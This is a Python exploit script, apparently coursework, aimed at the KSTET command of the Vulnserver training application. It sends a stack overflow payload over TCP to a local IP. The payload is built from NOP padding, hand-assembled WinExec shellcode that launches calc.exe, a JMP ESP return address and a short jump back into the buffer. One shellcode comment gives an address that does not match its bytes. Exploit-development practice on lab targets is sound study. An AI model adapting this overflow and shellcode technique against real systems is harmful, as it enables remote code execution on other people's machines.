#!/usr/bin/env python

from struct import pack
import socket

# Server
# http://www.thegreycorner.com/p/vulnserver.html

# Quick n dirty calc.exe
# https://www.fuzzysecurity.com/tutorials/expDev/6.html

# "Relative jmp back" 
#  (Coursework)

def p(x):
    return pack('<I',x)

calc = ("\x33\xc0"             #=> XOR EAX,EAX          |  Zero out EAX register
"\x50"                 #=> PUSH EAX             |  Push EAX to have null-byte padding for "calc.exe"
"\x68\x2E\x65\x78\x65" #=> PUSH ".exe"          \  Push The ASCII string to the stack
"\x68\x63\x61\x6C\x63" #=> PUSH "calc"          /  
"\x8B\xC4"             #=> MOV EAX,ESP          |  Put a pointer to the ASCII string in EAX
"\x6A\x01"             #=> PUSH 1               |  Push uCmdShow parameter to the stack
"\x50"                 #=> PUSH EAX             |  Push the pointer to lpCmdLine to the stack
"\xBB\x90\x53\x22\x77" #=> MOV EBX,7C862AED     |  Move the pointer to WinExec() into EBX
"\xFF\xD3")


jmp_esp = p(0x625011af)
offset_len = 70
tmp = "1234"
caboose_debug = "AmmmAAAnnnAAAoooAAApppAAAqqqAAArrrAAAsssAAAtttAAAuuuAAAvvvAAAwwwAAAxxxAAAyyyAAAzzzBBBaaaBBBbbbBBBcccBBBdddBBBeeeBBBfffBBBgggBBBhhhBBBiiiBBBjjjBBBkkkBBBlllBBBmmmBBBnnnBBBoooBBBpppBBBqqqBBBrrrBBBsssBBBtttBBBuuuBBBvvvBBBwwwBBBxxxBBByyyBBBzzzCCCaaaCCCbbbCCCcccCCCdddCCCeeeCCCfffCCCgggCCChhhCCCiiiCCCjjjCCCkkkCCClllCCCmmmCCCnnnCCCoooCCCpppCCCqqqCCCrrrCCCsssCCCtttCCCuuuCCCvvvCCCwwwCCCxxxCCCyyyCCCzzzDDDaaaDDDbbbDDDcccDDDdddDDDeeeDDDfffDDDgggDDDhhhDDDiiiDDDjjjDDDkkkDDDlllDDDmmmDDDnnnDDDoooDDDpppDDDqqqDDDrrrDDDsssDDDtttDDDuuuDDDvvvDDDwwwDDDxxxDDDyyyDDDzzzEEEaaaEEEbbbEEEcccEEEdddEEEeeeEEEfffEEEgggEEEhhhEEEiiiEEEjjjEEEkkkEEElllEEEmmmEEEnnnEEEoooEEEpppEEEqqqEEErrrEEEsssEEEtttEEEuuuEEEvvvEEEwwwEEExxxEEEyyyEEEzzzFFFaaaFFFbbbFFFcccFFFdddFFFeeeFFFfffFFFgggFFFhhhFFFiiiFFFjjjFFFkkkFFFlllFFFmmmFFFnnnFFFoooFFFpppFFFqqqFFFrrrFFFsssFFFtttFFFuuuFFFvvvFFFwwwF"
opt = 'KSTET '


exploit = ""
exploit += opt
exploit += '\x41\x41'
exploit += '\x90' * (offset_len - len(calc) - 2 - 23)
exploit += calc
exploit += 'B' * (48 - len(calc))
#exploit += tmp
exploit += jmp_esp
exploit += '\xEB\xC6' # Smol jmp back :3
exploit += 'Z' * (len(caboose_debug))
exploit += '\r\n'


fd = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
fd.connect(('192.168.1.66',6666))
print(fd.recv(1024))
fd.send(exploit)
